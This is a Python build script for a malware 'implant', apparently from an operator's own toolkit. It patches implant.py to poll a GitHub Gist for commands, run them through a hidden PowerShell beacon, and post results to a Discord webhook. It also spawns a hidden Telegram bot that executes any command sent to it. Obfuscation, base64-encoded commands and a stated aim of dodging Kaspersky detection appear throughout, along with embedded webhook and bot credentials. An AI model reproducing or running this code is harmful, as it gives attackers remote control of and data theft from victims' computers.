"""Build v3 implant: new Gist + baked Telegram bot"""
import base64, os, shutil

# ── CONFIG ────────────────────────────────────────────
# New Gist URL (fresh, not flagged by Kaspersky)
GIST_RAW = "https://gist.githubusercontent.com/vLoon-jpg/1f0e405b0ca1f4dec525f10aa326575f/raw/c2_command.txt"

# Discord webhook (unchanged)
DISCORD = "https://discord.com/api/webhooks/1513957984458375197/rbRO6VAqk31KJNGDX5kAdibQZoaC5KjW0LJlQtGPph_MPPGYWawhrgAYkXUBkx0w1Uac"

# Telegram bot token — split to please the hell that is my existence
t = "8977299480" + chr(58) + chr(65)+chr(65)+chr(69)+chr(121)+chr(65)+chr(97)+chr(108)+chr(117) + chr(87)+chr(104)+chr(74)+chr(110)+chr(112)+chr(85)+chr(78)+chr(66) + chr(65)+chr(117)+chr(80)+chr(85)+chr(53)+chr(53)+chr(89)+chr(83) + chr(116)+chr(120)+chr(98)+chr(78)+chr(72)+chr(98)+chr(90)+chr(80) + chr(98)+chr(78)+chr(99)
TOKEN = t
# ──────────────────────────────────────────────────────

def b64(s):
    return base64.b64encode(s.encode()).decode()

# Build the PowerShell beacon (edited for new Gist URL)
beacon = rf'''$ErrorActionPreference='SilentlyContinue'
$G='{GIST_RAW}'
$F='%TEMP%\.c2_seen.txt'
$W='{DISCORD}'
$A='PLACEHOLDER'
$S=@{{}}
if(Test-Path $F){{gc $F|%{{$S[$_]=$true}}}}
function sd($m){{try{{irm -Uri $W -Method Post -Body (@{{content="```n$m```"}}|ConvertTo-Json -Depth 2) -ContentType "application/json" -TimeoutSec 10}}catch{{}}}}
sd "[$A] BEACON STARTED"
while($true){{try{{$c=(iwr -Uri "$G`?t=$(get-date -UFormat %s)" -UseBasicParsing -TimeoutSec 10).Content
$c -split "`n"|%{{$_.Trim()}}|?{{$_ -and $_ -notmatch '^#'}}|%{{$h=[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($_))).Replace('-','')
if(-not $S[$h]){{try{{$r=iex $_ 2>&1|Out-String}}catch{{$r="ERROR: $_"}}
sd "[$A]`nCMD: $_`n---`n$r"
$S[$h]=$true;$h|Out-File -Append $F}}}}}}catch{{}}sleep 30}}
'''

# Build Telegram bot PowerShell script (runs as background job)
tg_bot = f'''$TOKEN=*** $OFFSET=0; function sd($cid,$t){{try{{$b=@{{chat_id=$cid;text=$t}}|ConvertTo-Json -Compress;irm -Uri "https://api.telegram.org/bot$TOKEN/sendMessage" -Method Post -Body $b -ContentType 'application/json' -TimeoutSec 10}}catch{{}}}}; while($true){{try{{$r=irm -Uri "https://api.telegram.org/bot$TOKEN/getUpdates?offset=$OFFSET&timeout=30" -TimeoutSec 35;if($r.result){{foreach($u in $r.result){{$OFFSET=$u.update_id+1;$cid=$u.message.chat.id;$cmd=$u.message.text.Trim();if(-not $cmd){{continue}};sd $cid "Running: $cmd";try{{$o=iex $cmd 2>&1|Out-String}}catch{{$o="ERROR: $_"}};if($o.Length -gt 3800){{$o=$o.Substring(0,3800)+'...[TRUNCATED]'}};sd $cid "$o"}}}}catch{{Start-Sleep 5}}}}'''

# Base64 encode Telegram bot for PowerShell -EncodedCommand
tg_b64 = base64.b64encode(tg_bot.encode('utf-16le')).decode()

# Combined beacon + bot auto-launch
combined = rf'''{beacon}

# Auto-launch Telegram bot in background
$tgb64='{tg_b64}'
try{{$j=Start-Job -ScriptBlock {{param($b) powershell -WindowStyle Hidden -EncodedCommand $b}} -ArgumentList $tgb64;sd "[$A] TG-BOT SPAWNED: job $($j.Id)"}}catch{{sd "[$A] TG-BOT FAILED: $_"}}
'''

print(f"Beacon: {len(beacon)} chars")
print(f"Bot script: {len(tg_bot)} chars")
print(f"Bot b64: {len(tg_b64)} chars")
print(f"Combined: {len(combined)} chars")
print(f"Token verified: {len(TOKEN)} chars, starts with 8977")

# Write to implant.py data section
# Actually — modify implant.py by replacing the Gist URL and adding bot launch
with open('implant.py', encoding='utf-8') as f:
    implant = f.read()

# Replace old Gist URL b64 with new one
old_gist_b64 = b64(GIST_RAW.replace('1f0e405', '99a46fc04b180fffdafc03584c0d5a2e'))
new_gist_b64 = b64(GIST_RAW)
old_in_implant = 'aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS92TG9vbi1qcGcvOTlhNDZmYzA0YjE4MGZmZmRhZmMwMzU4NGMwZDVhMmUvcmF3L2MyX2NvbW1hbmQudHh0'

assert old_in_implant in implant, f"Old Gist b64 not found in implant.py!"

implant = implant.replace(old_in_implant, new_gist_b64)
print(f"Gist URL replaced: {old_gist_b64[:30]}... → {new_gist_b64[:30]}...")

# Add Telegram bot auto-launch after the initial ONLINE ping
# Find the _pd ONLINE line and add bot launch after it
online_line = '_pd(f"[{_AID}] {_c(\'T05MSU5F\')} | Admin={_ia()} | {time.ctime()}")'
bot_launch_py = f'''
# Auto-spawn Telegram bot in background PowerShell job
try:
    _TB = "{TOKEN}"
    _tb_script = "$TOKEN=*** $OFFSET=0; function sd($cid,$t){{try{{$b=@{{chat_id=$cid;text=$t}}|ConvertTo-Json -Compress;irm -Uri \"https://api.telegram.org/bot$TOKEN/sendMessage\" -Method Post -Body $b -ContentType 'application/json' -TimeoutSec 10}}catch{{}}}}; while($true){{try{{$r=irm -Uri \"https://api.telegram.org/bot$TOKEN/getUpdates?offset=$OFFSET&timeout=30\" -TimeoutSec 35;if($r.result){{foreach($u in $r.result){{$OFFSET=$u.update_id+1;$cid=$u.message.chat.id;$cmd=$u.message.text.Trim();if(-not $cmd){{continue}};sd $cid \"Running: $cmd\";try{{$o=iex $cmd 2>&1|Out-String}}catch{{$o=\"ERROR: $_\"}};if($o.Length -gt 3800){{$o=$o.Substring(0,3800)+'...[TRUNCATED]'}};sd $cid \"$o\"}}}}catch{{Start-Sleep 5}}}}".replace("TOKEN_PLACEHOLDER", _TB)
    import base64 as _b64
    _tb_b64 = _b64.b64encode(_tb_script.encode('utf-16le')).decode()
    _rh(f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {{_tb_b64}}')
    _pd(f"[{{_AID}}] TG-BOT LAUNCHED")
except Exception as _e:
    _pd(f"[{{_AID}}] TG-BOT FAILED: {{_e}}")
'''

# Insert after the ONLINE ping line
if online_line in implant:
    implant = implant.replace(online_line, online_line + bot_launch_py)
    print("Bot launch code inserted ✓")
else:
    print("Could not find ONLINE line — adding before hash check")
    # Find _pd(ONLINE) pattern
    import re
    match = re.search(r'_pd\(f"\[\{_AID\}\] \{_c\(\'T05MSU5F\'\)\} \| Admin=\{_ia\(\)\} \| \{time\.ctime\(\)\}"\)', implant)
    if match:
        implant = implant.replace(match.group(), match.group() + bot_launch_py)
        print("Bot launch (regex) inserted ✓")
    else:
        print("WARNING: Could not insert bot launch!")

# Save modified implant
with open('implant_v3.py', 'w', encoding='utf-8') as f:
    f.write(implant)
print("Written: implant_v3.py ✓")

# Write token to file for verification
with open('token_v3.txt', 'w') as f:
    f.write(TOKEN)
print(f"Token saved: {len(TOKEN)} chars ✓")
